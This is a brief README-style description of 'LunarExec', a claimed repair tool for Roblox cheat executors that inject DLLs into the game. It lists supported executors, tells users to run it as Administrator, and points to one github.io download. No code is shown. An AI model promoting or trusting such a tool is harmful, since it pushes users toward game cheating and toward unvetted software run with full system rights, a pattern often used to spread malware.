LUNAREXEC v2.5 - Advanced Executor Repair Tool
===============================================

Description:
LunarExec is an advanced repair utility designed to fix common issues with Roblox executors.
This tool repairs DLL injection failures, UI rendering issues, and performance problems.

Supported Executors:
- Velocity, Nezur, Ronix, Solara, AWP, Swift
- Volcano, Xeno, Hydrogen, Codex, Elysian, Zen

Usage Instructions:
1. Ensure Roblox is completely closed
2. Run LunarExec as Administrator
3. Select the issues you want to fix
4. Click 'Start Repair' and wait for completion
5. Restart your executor after repair completes

Important: Always run this tool as Administrator for proper system access.
===============================================

THE ONLY OFFICIAL DOWNLOAD IS LUNAREXEC.GITHUB.IO